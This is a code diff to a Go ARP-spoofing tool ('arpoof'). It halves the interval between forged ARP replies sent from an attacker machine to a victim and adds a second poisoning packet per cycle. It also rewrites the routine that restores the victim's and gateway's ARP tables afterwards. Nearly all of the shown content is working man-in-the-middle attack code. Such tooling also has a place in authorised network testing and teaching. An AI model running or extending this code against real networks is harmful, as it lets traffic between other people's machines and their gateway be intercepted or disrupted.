@@ -3,6 +3,8 @@ package arpoof
 import (
 	"bytes"
 	"log"
+	"math/rand"
+	"net"
 	"os"
 	"os/signal"
 	"time"
@@ -47,9 +49,9 @@ func Spoof(target, gateway hdisc.DevData) {
 	// go readARP(handle, stop, ifi)
 	go readARP(handle, stop, target, gateway)
 
-	<-WriteARPPack(handle, *localDev, target, time.Millisecond*500, stop)
+	<-WriteARPPack(handle, *localDev, target, time.Millisecond*250, stop)
 
-	<-RestoreARPTables(handle, target, gateway)
+	<-RestoreARPTables(handle, gateway, target)
 	// when there is a signal to stop from writing, continue to return
 	return
 }
@@ -81,6 +83,16 @@ func WriteARPPack(handle *pcap.Handle, attacker, target hdisc.DevData, timeout t
 					log.Printf("Error writing packet to handle: %s\n", err)
 					continue
 				}
+
+				p, err = NewARPRep(attacker, target)
+				if err != nil {
+					log.Printf("Error creating arp reply: %s\n", err)
+					continue
+				}
+				if err = handle.WritePacketData(p); err != nil {
+					log.Printf("Error writing packet to handle: %s\n", err)
+					continue
+				}
 				log.Printf("Sending ARP packet: (%s:%s) -> (%s:%s)\n", attacker.IP.String(), attacker.Mac.String(), target.IP.String(), target.Mac.String())
 			}
 		}
@@ -89,17 +101,55 @@ func WriteARPPack(handle *pcap.Handle, attacker, target hdisc.DevData, timeout t
 	return stopped
 }
 
-func RestoreARPTables(handle *pcap.Handle, src, victim hdisc.DevData) chan struct{} {
+func RestoreARPTables(handle *pcap.Handle, gateway, victim hdisc.DevData) chan struct{} {
 	log.Println("Restoring ARP tables on the victim machine...")
-
 	stopCh := make(chan struct{})
+
+	// go func() {
+	// 	t := time.NewTicker(time.Second * 5)
+	// 	<-t.C
+	// 	close(stopCh)
+	// }()
+	//
+	// return WriteARPPack(handle, gateway, victim, time.Millisecond*200, stopCh)
+
 	go func() {
-		t := time.NewTicker(time.Second * 5)
-		<-t.C
-		close(stopCh)
+		t := time.NewTicker(time.Millisecond * 250)
+		resDur := time.NewTimer(time.Second * 5)
+
+		for {
+			select {
+			case <-resDur.C:
+				t.Stop()
+				close(stopCh)
+				return
+			case <-t.C:
+				// Restore victim's view: "Gateway is at its real MAC"
+				p, err := NewARPRep(gateway, victim)
+				if err != nil {
+					log.Printf("Error creating victim restoration packet: %v\n", err)
+					continue
+				}
+				if err := handle.WritePacketData(p); err != nil {
+					log.Printf("Error sending to victim: %v\n", err)
+				}
+
+				// Restore gateway's view: "Victim is at its real MAC"
+				p, err = NewARPRep(victim, gateway)
+				if err != nil {
+					log.Printf("Error creating gateway restoration packet: %v\n", err)
+					continue
+				}
+				if err := handle.WritePacketData(p); err != nil {
+					log.Printf("Error sending to gateway: %v\n", err)
+				}
+
+				log.Println("Sent ARP restoration packets")
+			}
+		}
 	}()
 
-	return WriteARPPack(handle, src, victim, time.Millisecond*200, stopCh)
+	return stopCh
 }
 
 // func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
